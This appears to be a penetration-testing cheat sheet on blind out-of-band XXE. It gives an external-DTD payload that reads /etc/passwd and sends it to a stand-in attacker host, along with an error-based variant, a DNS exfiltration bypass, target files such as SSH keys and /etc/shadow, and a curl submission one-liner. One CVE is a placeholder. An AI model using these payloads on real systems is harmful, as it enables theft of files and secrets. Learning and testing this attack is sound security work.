# XXE — Blind OOB Exfiltration

## 📌 What It Is
Server parses XML with external entities; output not reflected. Use external DTD to exfil files via DNS/HTTP to attacker server.

## 🔍 How to Find It
Try classic XXE first (file:///etc/passwd). If response doesn't reflect → blind. Probe with OOB.

## 🧪 How to Test It
1. Host DTD on attacker server: `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">%eval;%exfil;`\n2. Submit XML referencing external DTD.\n3. Watch attacker logs for inbound request with file content in URL.

## 💣 How to Exploit It
Read sensitive files (`/etc/shadow`, `~/.ssh/id_rsa`, `/proc/self/environ`). Chain to SSRF via XXE.

## 🔄 Bypass Techniques
If outbound HTTP blocked → use DNS exfil with TXT records. Or error-based: `<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>`.

## 🛠️ Tools
- Burp Collaborator\n- interactsh-client\n- xxeserver.py (custom)

## 🎯 Payloads
See PAYLOADS/xxe_payloads.md.

## 📝 Real-World Examples
Apache Solr CVE-2017-12629, GitLab CVE-2018-XXX.

## 🚩 Common Mistakes / Traps
Don't request files >1MB via DNS — too slow. Don't include null bytes in entity values.

## 📊 Severity & Impact
High to Critical (8-10) — file read = secrets compromise.

## 🔗 References
OWASP XXE, PortSwigger XXE labs.

## ⚡ One-Liners
```bash\ncat payload.xml | curl -X POST --data-binary @- 'https://target/upload' -H 'Content-Type: application/xml'\n```
